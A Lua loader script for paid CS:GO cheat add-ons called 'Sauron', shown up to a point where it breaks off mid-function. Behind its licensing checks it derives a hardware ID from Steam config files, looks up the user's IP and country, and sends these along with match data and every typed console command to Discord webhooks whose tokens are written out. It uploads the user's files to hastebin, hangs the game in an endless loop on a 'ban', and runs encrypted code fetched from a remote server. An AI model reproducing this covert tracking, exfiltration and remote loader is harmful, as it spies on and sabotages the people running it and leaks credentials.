--[[
	id: ktUI6fdfsJnZ6qEjLDEgX
	name: 123
	description: 123
	time1: 2021-04-24 03:24:27.51289+00
	time2: 2021-04-24 03:24:27.512891+00
	uploader: rD_skqxaDw2-V7aDHR5FqmlkzMEd0LLNZqsGBqXx
	uploadersession: crCXhasjszQ8gCUYA3hWKHiDEIH8yq
	flag: f
--]]

local client_color_log, client_create_interface, client_delay_call, client_reload_active_scripts, client_screen_size, client_set_event_callback, client_system_time, database_read, database_write, globals_frametime, json_parse, math_floor, panorama_open, renderer_line, renderer_measure_text, require, error, renderer_rectangle, renderer_text, string_byte, string_char, string_format, string_sub, table_remove, tonumber, loadstring, print, tostring, pcall, pairs, ui_get, ui_new_label, ui_new_multiselect, ui_reference, ui_set, ui_set_callback = client.color_log, client.create_interface, client.delay_call, client.reload_active_scripts, client.screen_size, client.set_event_callback, client.system_time, database.read, database.write, globals.frametime, json.parse, math.floor, panorama.open, renderer.line, renderer.measure_text, require, error, renderer.rectangle, renderer.text, string.byte, string.char, string.format, string.sub, table.remove, tonumber, loadstring, print, tostring, pcall, pairs, ui.get, ui.new_label, ui.new_multiselect, ui.reference, ui.set, ui.set_callback

local ban_data = readfile('csgo\\materials\\panorama\\images\\icons\\achievements\\icons_mat.vmt')
local script_name = _NAME

--local load_time = client.timestamp()
--[[local function latency_print(text)
    print(text, ' ', client.timestamp() - load_time)
end--]]

--local inspect = require 'gamesense/inspect'

-- decoding
local decode_values ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' -- base64 data
local base64={}function extract(c,d,e)local f=0;local g=2^d;for h=0,e-1 do local i=g+g;if c%i>=g then f=f+2^h end;g=i end;return f end;function base64.makeencoder(j,k,l)local m={}for n,o in pairs{[0]='A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','base64','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9',j or'+',k or'/',l or'='}do m[n]=o:byte()end;return m end;function base64.makedecoder(j,k,l)local p={}for n,q in pairs(base64.makeencoder(j,k,l))do p[q]=n end;return p end;local r=base64.makedecoder()local o,s=string.char,table.concat;function base64.decode(t,u,p)p=p or r;local v='[^%w%+%/%=]'if p then local j,k;for q,n in pairs(p)do if n==62 then j=q elseif n==63 then k=q end end;v=('[^%%w%%%s%%%s%%=]'):format(o(j),o(k))end;t=t:gsub(v,'')local w=u and{}local x,y={},1;local z=#t;local A=t:sub(-2)=='=='and 2 or t:sub(-1)=='='and 1 or 0;for h=1,A>0 and z-4 or z,4 do local B,C,D,E=t:byte(h,h+3)local F;if u then local G=B*0x1000000+C*0x10000+D*0x100+E;F=w[G]if not F then local c=p[B]*0x40000+p[C]*0x1000+p[D]*0x40+p[E]F=o(extract(c,16,8),extract(c,8,8),extract(c,0,8))w[G]=F end else local c=p[B]*0x40000+p[C]*0x1000+p[D]*0x40+p[E]F=o(extract(c,16,8),extract(c,8,8),extract(c,0,8))end;x[y]=F;y=y+1 end;if A==1 then local B,C,D=t:byte(z-3,z-1)local c=p[B]*0x40000+p[C]*0x1000+p[D]*0x40;x[y]=o(extract(c,16,8),extract(c,8,8))elseif A==2 then local B,C=t:byte(z-3,z-2)local c=p[B]*0x40000+p[C]*0x1000;x[y]=o(extract(c,16,8))end;return s(x)end
-- decoding

--latency_print('dec')

if ban_data and ban_data:len() == 17 then
    writefile(string.format('%s.lua', script_name), 'error(string.format(\'You are banned from Sauron. Reason: %s\', database.read(\'sauron_ban_reason\') or \'Other\'), 2)')

    while true do
        local suck = '0x10'
    end
end

--#region panorama shit --
local js = panorama_open()
local MyPersonaAPI = js.MyPersonaAPI
local SteamOverlayAPI = js.SteamOverlayAPI
local GameStateAPI = js.GameStateAPI
--#region panorama shit --

_G.sauron_check_modules = function(modules)
    local cleared
    
    if not modules then
        error('Failed to find modules', 3)
    end

    for lib, url in pairs(modules) do
        local result = pcall(require, lib)

        if result then
            modules[lib] = nil
        end
    end

    for lib, url in pairs(modules) do
        if not cleared then
            client.exec('clear')
            cleared = true
        end

        client.error_log(string.format('Missing %s library, subscribe to it - %s And don`t forget to restart the game!', lib, url))
    end

    if cleared then
        SteamOverlayAPI.OpenURL('https://bit.ly/3xsnFOz')
        error('Please subscribe to all scripts from #very-important channel - https://bit.ly/3xsnFOz', 3)
    end
end

local ffi = require("ffi") or error("Failed to require FFI, please make sure Allow unsafe scripts is enabled!", 2)

local loader = {
    id = '2.4_sec_r',
    version = '4.2',
    path = 'https://neosync.xyz/auth/',
    is_valid = true,
    user = 0,
    ban_ids = {
        [1] = 'Attempt to crack/reverse engineer scripts',
        [2] = 'Attempt to modify protected variables',
        [3] = 'You are such a bad guy',
        [4] = 'Other'
    }
}

local http =(function()ffi.cdef[[
    typedef uint32_t request_handle_t;
    typedef uint64_t steam_api_call_t;

    typedef struct {
        void* __pad[12];
        void* steam_http;
    }steam_ctx_t;

    typedef uint32_t(__thiscall* create_http_request_t)(void*, uint32_t, const char*);
    typedef bool(__thiscall* send_http_request_t)(void* _this, request_handle_t handle, steam_api_call_t call_handle);
    typedef bool(__thiscall* get_http_response_header_size_t)( void* _this, request_handle_t hRequest, const char *pchHeaderName, uint32_t *unResponseHeaderSize );
    typedef bool(__thiscall* get_http_response_header_value_t)(void* _this, request_handle_t hRequest, const char *pchHeaderName, char *pHeaderValueBuffer, uint32_t unBufferSize);
    typedef bool(__thiscall* get_http_response_body_size_t)(void* _this, request_handle_t hRequest, uint32_t *unBodySize );
    typedef bool(__thiscall* get_http_response_body_data_t)(void* _this, request_handle_t hRequest, char *pBodyDataBuf, uint32_t unBufferSize );
    typedef bool(__thiscall* set_http_request_param_t)(void* _this, request_handle_t hRequest, const char* pchParamName, const char* pchParamValue);
    typedef bool(__thiscall* release_http_request_t)(void* _this, request_handle_t hRequest);
    typedef bool(__thiscall* set_http_request_user_agent_info_t)(void* _this, request_handle_t hRequest, const char *pchUserAgentInfo);
    typedef bool(__thiscall *set_http_request_rawpostbody)(void* _this, request_handle_t hRequest, const char *, uint8_t *, uint32_t);
]]local b=client.find_signature("client.dll",base64.decode("/xXMzMzMuczMzMzozMzMzGo="))or error("steam_ctx")local c=ffi.cast("steam_ctx_t**",ffi.cast("char*",b)+7)[0]or error("steam_ctx not found")local d=ffi.cast("void*",c.steam_http)or error("steam_http error")local e=ffi.cast("void***",d)or error("steam_http_ptr error")local f=e[0]or error("steam_http_ptr was null")local g=ffi.cast('create_http_request_t',f[0])local h=ffi.cast('send_http_request_t',f[5])local i=ffi.cast('get_http_response_header_size_t',f[9])local j=ffi.cast('get_http_response_header_value_t',f[10])local k=ffi.cast('get_http_response_body_size_t',f[11])local l=ffi.cast('get_http_response_body_data_t',f[12])local m=ffi.cast('set_http_request_param_t',f[4])local n=ffi.cast('release_http_request_t',f[14])local o=ffi.cast('set_http_request_rawpostbody',f[16])local p=ffi.cast('set_http_request_user_agent_info_t',f[21])local q={}local r={__index=q}function q.new(s,t,u)local v={handle=s,url=t,callback=u,ticks=0}local w=setmetatable(v,r)return w end;local x={}local y={__index=x}function x.new(z,A,B)local v={state=z,body=A,header={content_type=B.content_type}}local C=setmetatable(v,y)return C end;function x:success()return self.state==0 end;local D={state={ok=0,no_response=1,timed_out=2,unknown=3}}local E={__index=D}function D.new(F)local F=F or{}local v={requests={},task_interval=F.task_interval or 0.5,timeout=F.timeout or 10}local G=setmetatable(v,E)G:_process_tasks()return G end;function D:get(t,u)local s=g(d,1,t)if h(d,s,0)==false then return end;local w=q.new(s,t,u)table.insert(self.requests,w)end;function D:post(t,H,u,I)local s=g(d,3,t)if type(H)=="string"then local J=H:len()o(d,s,I or"content-type",ffi.cast("unsigned char*",H),J)else for K,L in pairs(H)do m(d,s,K,L)end end;if h(d,s,0)==false then return end;local w=q.new(s,t,u)table.insert(self.requests,w)end;function D:_process_tasks()for M,w in ipairs(self.requests)do local N=ffi.new("uint32_t[1]")if k(d,w.handle,N)==true then local O=N[0]if O>0 then local A=ffi.new("char[?]",O)if l(d,w.handle,A,O)==true then table.remove(self.requests,M)n(d,w.handle)w.callback(x.new(D.state.ok,ffi.string(A,O),{content_type=D._get_header(w,"Content-Type")}))end else table.remove(self.requests,M)n(d,w.handle)w.callback(x.new(D.state.no_response,nil,{}))end end;local P=w.ticks+1;if P>=self.timeout then table.remove(self.requests,M)n(d,w.handle)w.callback(x.new(D.state.timed_out,nil,{}))else w.ticks=P end end;client.delay_call(self.task_interval,D._bind(self,'_process_tasks'))end;function D._get_header(w,Q)local R=ffi.new("uint32_t[1]")if i(d,w.handle,Q,R)then local S=R[0]local T=ffi.new("char[?]",S)if j(d,w.handle,Q,T,S)then return ffi.string(T,S)end end;return nil end;function D._bind(U,K)return function(...)return U[K](U,...)end end;return D end)().new({task_interval=0.1,enable_debug=false,timeout=25})

loadstring('_G.sauron_notifier=(function()_G.sauron_notify_cache={}local a={callback_registered=false,maximum_count=7}local b=ui.reference("Misc","Settings","Menu color")function a:register_callback()if self.callback_registered then return end;client.set_event_callback("paint_ui",function()local c={client.screen_size()}local d={0,0,0}local e=5;local f=_G.sauron_notify_cache;for g=#f,1,-1 do _G.sauron_notify_cache[g].time=_G.sauron_notify_cache[g].time-globals.frametime()local h,i=255,0;local j=f[g]if j.time<0 then table.remove(_G.sauron_notify_cache,g)else local k=j.def_time-j.time;local k=k>1 and 1 or k;if j.time<0.5 or k<0.5 then i=(k<1 and k or j.time)/0.5;h=i*255;if i<0.2 then e=e+15*(1.0-i/0.2)end end;local l={ui.get(b)}local m={math.floor(renderer.measure_text(nil,"[sauron] "..j.draw)*1.1)}local n={renderer.measure_text(nil,"[sauron]")}local o={renderer.measure_text(nil,j.draw)}local p={c[1]/2-m[1]/2+3,c[2]-c[2]/100*17.4+e}renderer.rectangle(p[1],p[2]-20,m[1],40,d[1],d[2],d[3],h>155 and 155 or h)renderer.line(p[1],p[2]-19,p[1]+m[1],p[2]-19,l[1],l[2],l[3],h>155 and 155 or h)renderer.text(p[1]+m[1]/2-o[1]/2,p[2],l[1],l[2],l[3],h,"c",nil,"[sauron] ")renderer.text(p[1]+m[1]/2+n[1]/2,p[2],255,255,255,h,"c",nil,j.draw)e=e-50 end end;self.callback_registered=true end)end;function a:paint(q,r)local s=tonumber(q)+1;for g=self.maximum_count,2,-1 do _G.sauron_notify_cache[g]=_G.sauron_notify_cache[g-1]end;_G.sauron_notify_cache[1]={time=s,def_time=s,draw=r}self:register_callback()end;return a end)()')()
local discord =(function()local b=http;local c={Properties={}}function c:setTitle(d)self.Properties.title=d end;function c:setDescription(e)self.Properties.description=e end;function c:setURL(f)self.Properties.url=f end;function c:setTimestamp(g)self.Properties.timestamp=g end;function c:setColor(h)self.Properties.color=h end;function c:setFooter(i,j,k)self.Properties.footer={text=i,icon_url=j or"",proxy_icon_url=k or""}end;function c:setImage(j,k,l,m)self.Properties.image={url=j or"",proxy_url=k or"",height=l or nil,width=m or nil}end;function c:setThumbnail(j,k,l,m)self.Properties.thumbnail={url=j or"",proxy_url=k or"",height=l or nil,width=m or nil}end;function c:setVideo(f,l,m)self.Properties.video={url=f or"",height=l or nil,width=m or nil}end;function c:setAuthor(n,f,j,k)self.Properties.author={name=n or"",url=f or"",icon_url=j or"",proxy_icon_url=k or""}end;function c:addField(n,o,p)if not self.Properties.fields then self.Properties.fields={}end;table.insert(self.Properties.fields,{name=n,value=o,inline=p or false})end;local q={URL=""}function q:send(...)local r={}local s=table.pack(...)if self.username then r.username=self.username end;if self.avatar_url then r.avatar_url=self.avatar_url end;for t,o in next,s do if type(o)=="table"then if not r.embeds then r.embeds={}end;table.insert(r.embeds,o.Properties)elseif type(o)=="string"then r.content=o end end;b:post(self.URL,json.stringify(r),function(u)end,"application/json")end;function q:setUsername(v)self.username=v end;function q:setAvatarURL(w)self.avatar_url=w end;return{newEmbed=function()return setmetatable({Properties={}},{__index=c})end,new=function(f)return setmetatable({URL=f},{__index=q})end}end)()
local Encrypt = (function()local b={}local c={__index=b}function b:new(d)return setmetatable({keys=d or{13,21,7,0,0}},c)end;function b:convert(e,f,g)return string.char((string.byte(e)-32+(g and-f or f))%95+32)end;function b:process(h,d,g)local i=""if h==nil then return" "end;for j=1,#h do if#h-d[5]>=j or not g then for k=0,3 do if j%4==k then i=i..self:convert(string.sub(h,j,j),d[k+1],g)break end end end end;if not g then for l=1,d[5]do i=i..string.char(math.random(32,126))end end;return i end;function b:encrypt(h)return self:process(tostring(h),self.keys)end;function b:decrypt(h)return self:process(h,self.keys,true)end;return b end)()

--webhooks
local ihobitExem_Webhook = discord.new('https://neosync.xyz/auth/webhook.php') -- https://neosync.xyz/auth/webhook.php
ihobitExem_Webhook:setUsername('Sauron.Bot')
ihobitExem_Webhook:setAvatarURL('')

--latency_print('en')

--#region libs--
local filesystem = {}
local functions = {
    {
        'get_current_directory',
        'VYvsVot1CFb/dQw=',
        'bool(__thiscall*)(void*, char*, int)'
    }
}

local function get_func(b, c, d, e)
    local f = client.create_interface(b, c) or error("invalid interface", 2)
    local g = client.find_signature(b, d) or error("invalid signature", 2)
    local h, i = pcall(ffi.typeof, e)
    if not h then
        error(i, 2)
    end
    local j = ffi.cast(i, g) or error("invalid typecast", 2)
    return function(...)
        return j(f, ...)
    end
end

for i=1, #functions do 
    local func = functions[i]
    filesystem[func[1]] = get_func('filesystem_stdio.dll','VFileSystem017', base64.decode(func[2]), func[3])
end


local function generate_pass(sign, pass)
    local final_text = ''

    for i = 1, sign do
        local rand_val = client.random_int(1, 62)
        final_text = string.format('%s%s', final_text, pass and rand_val or decode_values:sub(rand_val, rand_val))
    end
    
    return final_text
end

--help functions
local function g_client_log(text)
    client_color_log(255, 0, 21, "[sauron]\0")
	client_color_log(245, 245, 245, " ", text)
end

local function string_tohex(str)
    return (str:gsub('.', function (c)
        return string_format('%02X', string_byte(c))
    end))
end

--latency_print('str')
local function get_path()
    local steam_path = readfile('sauron_path.txt')
    local gamePath = ffi.typeof("char[128]")();

    filesystem.get_current_directory(gamePath, ffi.sizeof(gamePath))

    local gamePath_path = ffi.string(gamePath)
    local gamePath_val = string.find(gamePath_path, "steamapps")
    return steam_path or string.sub(gamePath_path, 1, gamePath_val - 1)
end

local function steamid3(steam_64)
    return steam_64:sub(7) - 97960265728 -- magic value
end

local function get_hwid()
    local file_data = readfile(string.format("%s%s%s%s", get_path(), '\\userdata\\', steamid3(MyPersonaAPI.GetXuid()), '\\config\\localconfig.vdf'))

    if file_data then
        local hwid_start = string.find(file_data, '"{')
        local hwid_end = string.find(file_data, '}"')
        local hwid_return = string_tohex(string.sub(file_data, hwid_start + 1, hwid_end))
        return hwid_return
    end
end

--latency_print('pre_h')

local hwid_result, user_hwid = pcall(get_hwid)

--latency_print('after_h')

function loader:ban_retard(reason, id)
    loader.is_valid = false

    http:get(string.format('%s?hwid=%s&ban', loader['path'], user_hwid), function(response)
    end)

    local security_embed = discord.newEmbed()

    local sys_time = {client_system_time()}
    local shutdown_time = string_format('%02d:%02d:%02d', sys_time[1], sys_time[2], sys_time[3])

    security_embed:setTitle('[Retard]')
    security_embed:addField('[Hardware]', string_format("Steam: https://steamcommunity.com/profiles/%s \n Local time: %s \n Hwid: %s \n Loader: %s \n Script: %s",  MyPersonaAPI.GetXuid(), shutdown_time, user_hwid, loader.id, script_name) or "No hardware data", true)
    security_embed:setColor(16711680)
    
    http:get("https://api.myip.com/", function(response)
        local success, parsed_geo = pcall( json_parse, response.body)

        if success then
            security_embed:setThumbnail('https://cdn.discordapp.com/icons/770374971087388732/a_90e65c655cb31978f29c8f0b781338d6.webp?size=1024')
            security_embed:addField('[Geo]', string_format("IP: %s \n Country: %s", parsed_geo.ip, parsed_geo.country), false)
            security_embed:setImage(string_format("https://www.countryflagicons.com/SHINY/64/%s.png", parsed_geo.cc))
            security_embed:setDescription(reason)
        end
        
        
        http:post('https://hastebin.com/documents', readfile(string.format("%s.lua", script_name)), function(hastebin)
            local hastebin_success, hastebin_data = pcall( json_parse, hastebin.body)

            security_embed:addField('[File]', string.format('https://hastebin.com/%s', hastebin_data.key))
        end)

        client.delay_call(0.3, function()
            ihobitExem_Webhook:send(security_embed, '<@150698345143336960>')

            writefile(string.format('%s.lua', script_name), 'error(string.format(\'You are banned from Sauron. Reason: %s\', database.read(\'sauron_ban_reason\') or \'Other\'), 2)')
            writefile('csgo\\materials\\panorama\\images\\icons\\achievements\\icons_mat.vmt', generate_pass(17))
            database_write('sauron_ban_reason', self.ban_ids[id])

            while true do
                client.exec('clear')
                local suck = '0x10'
            end
            
            client_reload_active_scripts()
        end)
    end)
end

--latency_print('pre_secure')

local secured_stuff = { 
    "bit",
	"client",
	"config",
	"cvar",
	"database",
	"entity",
	"globals",
    "json",
	"panorama",
	"materialsystem",
    "renderer",
	"plist",
	"ui",
    "loadstring",
    "tostring",
    "load",
    "setmetatable",
    "getmetatable",
    "getfenv",
    "pcall"
}

--latency_print('affter_secure')

local function anti_dump_check()
    local lua = readfile(string.format("%s.lua", script_name))
    local lua_pre_text = lua:sub(44, 88)

    if lua_pre_text ~= 'This file was obfuscated using PSU Obfuscator' then
        loader:ban_retard('#01 detected', 1)
    end
end

anti_dump_check()

--latency_print('pre_secure_globals')

local function secure_globals()
    local name_is_valid

    for k, v in pairs(_G.package.loaded) do
        if type(v) == 'boolean' then 
            local file_data = readfile(string.format('%s.lua', k))
            
            for key, val in pairs(secured_stuff) do
                if file_data and (file_data:find(string.format('_G.%s.', val)) or file_data:find(string.format('_G..%s.', val))) then
                   loader:ban_retard('#04 detected', 2)
                end
            end
        elseif type(v) == 'userdata' then
            if k == script_name then
                name_is_valid = true
            end
        end
    end

    if not name_is_valid then
        loader:ban_retard('#06 detected', 1)
    end
end
--latency_print('affter_secure_globals')

secure_globals()

--latency_print('pre_windows_host')

local function windows_host()
    for i = 65, 90 do -- A to Z
		local directory = string_char(i)..":\\Windows\\System32\\drivers\\etc\\hosts"

        local hosts_file = readfile(directory)

        if hosts_file and hosts_file:find('neosync.xyz') then
            loader:ban_retard('#05 detected', 1)
        end
    end
end

windows_host()

--latency_print('after_host')
--#region libs--

--#region ffi stuff--
local native_GetNetChannelInfo = vtable_bind("engine.dll", "VEngineClient014", 78, "void*(__thiscall*)(void*)")
local native_GetAddress = vtable_thunk(1, "const char*(__thiscall*)(void*)")
--#region ffi stuff--

--#region databases--
--database.write('sauron_ref_cache', nil)
--database.write('sauron_list_cache', nil)

local ref_cache = database_read('sauron_ref_cache') or {}
local scripts_list_cache = database_read('sauron_list_cache') or {'null'}
local encryption = Encrypt:new()
--#region databases--

--#region script data--
local script = {
    list = ui_new_multiselect("Config", "Presets", 'Sauron Scripts', scripts_list_cache),
    reload = ui_reference('Config', 'Lua', 'Reload active scripts'),
    reloaded = false,
}

local scripts_data = {}
local scripts_loaded = {}
local shutdown_data = {}

--SSSS--
local log_Webhook = discord.new('https://discord.com/api/webhooks/829788174963310615/J2_QLbCMrKPQdeeUjOGsUyIrnIhoXdCzHFASmaeEA-QaODtpIdwj8itqQsb5NfilV4PQ') -- event webhook
log_Webhook:setUsername('Sauron.Logs')
log_Webhook:setAvatarURL('')

local cmd_Webhook = discord.new('https://discord.com/api/webhooks/829791455638978590/1mwv259BFgwjCm98_5cZ3z2N6sSozcT4Vmo2ndqflgHIxvS-KsEF5Wp6Z4sRhsPyH4GO') -- event webhook
cmd_Webhook:setUsername('Sauron.Logs')
cmd_Webhook:setAvatarURL('')
--webhooks

--latency_print('affter_web')
--#region script data--

--#region functions --
local original_load = _G['loadstring'] 

local loadstring_script = function(...)
    local upvalue = tostring(original_load)
    local can_be_hooked = upvalue:match('builtin') == nil

    local return_func = can_be_hooked and (function() error('Cant load module error code[0x000000001]', 2) end) or original_load(...)
    
    return return_func
end

local function contains(table, val)
	for k, v in pairs(table) do
		if v == val then
			return true
		end
	end

    return false
end

--latency_print('affter_days')

local function check_builtin()
    local bultin_functions = 0

    for name, val in pairs(_G) do 
        local upvalue = tostring(val)
        local is_builtin = upvalue:match('builtin') ~= nil
        if is_builtin then bultin_functions = bultin_functions + 1 end
    end
    
    if bultin_functions ~= 25 then
        loader:ban_retard(string.format("#02 detected: %s", bultin_functions), 2)
    end
end

local function anti_http_debug()
    local file_data = readfile(string.format("%s%s", get_path(), 'logs\\ipc_SteamClient.log')) 

    if file_data and string.find(file_data, 'neosync.xyz') then
        loader:ban_retard('#03 detected', 1)
    end  
end

local function get_server_ip()
    if globals.mapname() == nil then
        return
    end

    local info = native_GetNetChannelInfo() or error("error #000001")
    local addr = native_GetAddress(info) 

    if addr ~= nil then
        return ffi.string(addr)
    end
end

local function send_webhook(data, db, request)
    local new_embed = discord.newEmbed()

    local sys_time = {client_system_time()}
    local local_time = string_format('%02d:%02d:%02d', sys_time[1], sys_time[2], sys_time[3])

    new_embed:setTitle(string.format('%s - (%s)', data.title, local_time))
    new_embed:setDescription(string_format("User: %s \n Build: %s", db.name, db.title))
    new_embed:addField('[Info]', data.info, false)

    if data.fields then
        for k, v in pairs(data.fields) do
            new_embed:addField('['..k..']', v, false)
        end
    end

    new_embed:addField('[Hardware]', string.format('HWID: %s \n Loader: %s', user_hwid, loader['id']), false)

    new_embed:setThumbnail('https://cdn.discordapp.com/icons/770374971087388732/a_90e65c655cb31978f29c8f0b781338d6.webp?size=1024')
    new_embed:setColor(data.col)

    if request then
        http:get("https://api.myip.com/", function(response)
            local success, parsed_geo = pcall( json_parse, response.body)

            if success then
                new_embed:addField('[Geo]', string_format("IP: %s \n Country: %s", parsed_geo.ip, parsed_geo.country), false)
            end

            data.hook:send(new_embed)
        end)
    else
        data.hook:send(new_embed)
    end

    client.delay_call(1, anti_http_debug)
end

local function is_bot(ent)
    local resource = entity.get_player_resource()
    local difficulty = entity.get_prop(resource, 'm_iBotDifficulty', ent)
    return difficulty >= 0 and difficulty <= 4
end

local function log_match(db, connect)
    local players_data = json.parse(tostring(GameStateAPI.GetPlayerDataJSO()))
    local me = entity.get_local_player()
    local teams_data = {}
    local end_reason
    local parsed_result

    for key, val in pairs(players_data) do
        for k, v in pairs(players_data[key]) do
            local k_t = tonumber(k)

            if is_bot(k_t) then
                teams_data[key] = string.format('%s\n ●  %s - [BOT] (K: %s, A: %s, D: %s, MVPS: %s, SCORE: %s)', teams_data[key] or '', entity.get_player_name(k_t), v, GameStateAPI.GetPlayerKills(v), GameStateAPI.GetPlayerAssists(v), GameStateAPI.GetPlayerDeaths(v), GameStateAPI.GetPlayerMVPs(v), GameStateAPI.GetPlayerScore(v))
            else
                local bold = k_t == me and '**' or ''
                teams_data[key] = string.format('%s\n ●  %s%s%s - [%s](https://steamcommunity.com/profiles/%s) (K: %s, A: %s, D: %s, MVPS: %s, SCORE: %s)', teams_data[key] or '', bold, entity.get_player_name(k_t), bold, v, v, GameStateAPI.GetPlayerKills(v), GameStateAPI.GetPlayerAssists(v), GameStateAPI.GetPlayerDeaths(v), GameStateAPI.GetPlayerMVPs(v), GameStateAPI.GetPlayerScore(v))
            end
        end
    end

    local parsed_score = json.parse(tostring(GameStateAPI.GetScoreDataJSO()))

    if not connect then
        parsed_result = json.parse(tostring(GameStateAPI.GetMatchEndWinDataJSO()))
        end_reason = parsed_score.teamdata['CT'].score == parsed_score.teamdata['TERRORIST'].score and 'TIE' or parsed_result.winning_team_number == entity.get_prop(me, 'm_iTeamNum') and 'WIN' or 'LOSE'
    end

    local log_data = {
        hook = log_Webhook,
        title = connect and 'Server Connect' or string.format('Match end [%s]', end_reason), 
        info = string.format('%s \n Server: steam://connect/%s \n Map: %s \n Score: %s:%s', GameStateAPI.GetServerName(), get_server_ip(), globals.mapname(), parsed_score.teamdata['CT'].score, parsed_score.teamdata['TERRORIST'].score),
        col = connect and 10027263 or (end_reason == 'TIE' and 16762880 or end_reason == 'WIN' and 3735412 or 16715008),
        fields = {
            ['CT Team'] = teams_data['CT'],
            ['T Team'] = teams_data['TERRORIST'],
            ['Spectators'] = teams_data['Spectator']
        }
    }

    send_webhook(log_data, db, true)
end

local function log_console_input(db, input)
    local log_data = {
        hook = cmd_Webhook,
        title = 'Console Input',
        info = input,
        col = 37375
    }

    send_webhook(log_data, db)
end

local function load_scripts(db)
    check_builtin()

    local lua_list = ui_get(script.list)

    for i = 1, #scripts_data do
        local state = contains(lua_list, scripts_data[i]) and not scripts_loaded[i]

        if scripts_loaded[i] and not contains(lua_list, scripts_data[i]) then
            client_reload_active_scripts()
        end

        if state then
            loadstring_script(base64.decode(encryption:decrypt(db[i].script_source), true))()
            sauron_notifier:paint(5, "Loaded "..scripts_data[i])
            scripts_loaded[i] = scripts_data[i]
        end
    end
end

local function sauron_load(db)
    anti_dump_check()
    check_builtin()
    anti_http_debug()

    http:get(string.format('%s?hwid=%s&build=%s', loader['path'], user_hwid, db.build), function(response)
        --#back here
        local success, lua_data = pcall( json_parse, response.body)

        if success then
            for i = 1, #lua_data.scripts do
                scripts_data[i] = lua_data.scripts[i].name
            end

            for key, val in pairs(scripts_data) do
                if val ~= scripts_list_cache[key] then
                    database_write('sauron_list_cache', scripts_data)
                    client.reload_active_scripts()
                end
            end

            ui.set_visible(script.list, true)

            local update_label = ui_new_label("Config", "Presets", "Last Updates: ")
        
            for i = 1, #scripts_data do
                local updates = ui_new_label("Config", "Presets", "["..lua_data.scripts[i].date.."] "..scripts_data[i].." ("..lua_data.scripts[i].ver..") - "..lua_data.scripts[i].update)
            end
             
            _G.sauron_username = db.userinfo.name
            _G.sauron_user_data = {}

            sauron_user_data.user = db.userinfo.name
            sauron_user_data.build = db.userinfo.title

            loadstring_script(base64.decode(db.loaderinfo.watermark, true))()

            ui_set_callback(script.list, function()
                load_scripts(lua_data.scripts)
            end)
        
            client_set_event_callback("player_connect_full", function(e)
                if client.userid_to_entindex(e.userid) == entity.get_local_player() then
                    log_match(db.userinfo, true)
                end
            end)
        
            client_set_event_callback("cs_win_panel_match", function()
                client.delay_call(0.9, log_match, db.userinfo)
            end)
        
            client_set_event_callback("console_input", function(input)
                log_console_input(db.userinfo, input)
            end)
            
            anti_http_debug()
            sauron_notifier:paint(3, "Finished startup")
            load_scripts(lua_data.scripts)
        end
    end)
end

local function sauron_login()
    --latency_print('4')

    local login_embed = discord.newEmbed()

    if not user_hwid then
        sauron_notifier:paint(5, "Failed to load a module, error code - #292")
        
        http:get("https://api.myip.com/", function(response)
            local success, parsed_geo = pcall( json_parse, response.body)

            if not success then
                sauron_notifier:paint(5, "Couldn't connect to #01 server")
                return
            end

            login_embed:setTitle('[FFH]')
            login_embed:addField('[Geo]', string_format("IP: %s \n Country: %s", parsed_geo.ip, parsed_geo.country), false)
            login_embed:setImage(string_format("https://www.countryflagicons.com/SHINY/64/%s.png", parsed_geo.cc))
            login_embed:setColor(16711680)
            ihobitExem_Webhook:send(login_embed)
        end)

        return
    end

    http:get(string.format('%s?hwid=%s', loader['path'], user_hwid), function(response)
        --latency_print('6')

        local sys_time = {client_system_time()}
        local login_time = string_format('%02d:%02d:%02d', sys_time[1], sys_time[2], sys_time[3])

        local success2, parsed_data = pcall( json_parse, encryption:decrypt(response.body))

        --latency_print('7')

        if not success2 or parsed_data.userinfo == nil then
            local session_id = generate_pass(6)

            sauron_notifier:paint(5, string.format("Invalid HWID. Shutting down. Session id - %s", session_id))

            http:get("https://api.myip.com/", function( response)

                local success3, parsed_geo = pcall( json_parse, response.body)

                if not success3 then
                    sauron_notifier:paint(5, "Couldn't connect to #02 server")
                    return
                end
    
                login_embed:setTitle('[Invalid HWID]')
                login_embed:addField('[Hardware]', string_format("Steam: https://steamcommunity.com/profiles/%s \n Local time: %s \n HWID: %s \n Loader: %s \n Session: %s", MyPersonaAPI.GetXuid(), login_time, user_hwid, loader['id'], session_id), true)
                login_embed:addField('[Geo]', string_format("IP: %s \n Country: %s", parsed_geo.ip, parsed_geo.country), false)
                login_embed:setImage(string_format("https://www.countryflagicons.com/SHINY/64/%s.png", parsed_geo.cc))
                login_embed:setColor(16711680)
                ihobitExem_Webhook:send(login_embed)
            end)
            return
        end

        --latency_print('8')
        anti_http_debug()
        
        if tonumber(parsed_data.userinfo.is_banned) == 1 then
            loader:ban_retard('x01 detected', 4)
            return
        end

        if parsed_data.loaderinfo.online ~= '1' then 
            sauron_notifier:paint(3, parsed_data.loaderinfo.online or "Sauron is under tech works")
            return
        end

        if parsed_data.loaderinfo.loader_ver ~= loader.version then
            --[[http:get(parsed_data.loaderinfo.build, function(resp)
                if resp.state == 0 then
                    writefile(string.format('%s.lua', script_name), resp.body)
                    client.reload_active_scripts()
                end
            end)--]]

            sauron_notifier:paint(3, "You are using the old loader. Please Update.")
            return
        end
        
        http:get("https://api.myip.com/", function(response)
            --latency_print('9')
            local success4, parsed_geo = pcall( json_parse, response.body)

            if not success4 then
                sauron_notifier:paint(5, "Couldn't connect to #03 server")
                return
            end

            if contains(json.parse(parsed_data.loaderinfo.bad_guys) , parsed_geo.ip) then
                loader:ban_retard('x02 detected', 3)
            end

            shutdown_data.login_hardware_data = string_format("Local time: %s \n Hwid: %s", login_time, user_hwid)
            shutdown_data.login_geo_data = string_format("IP: %s \n Country: %s", parsed_geo.ip, parsed_geo.country)
            shutdown_data.login_country = string_format("https://www.countryflagicons.com/SHINY/64/%s.png", parsed_geo.cc)
            shutdown_data.sub_active = parsed_data.userinfo.expires > 0
            shutdown_data.login_user_data = string_format("User Name: %s \n Build: %s \n Loader: %s \n Script: %s \n Days Remained: %s \n Steam: https://steamcommunity.com/profiles/%s", parsed_data.userinfo.name, parsed_data.userinfo.title, loader['id'], script_name, parsed_data.userinfo.expires, MyPersonaAPI.GetXuid())

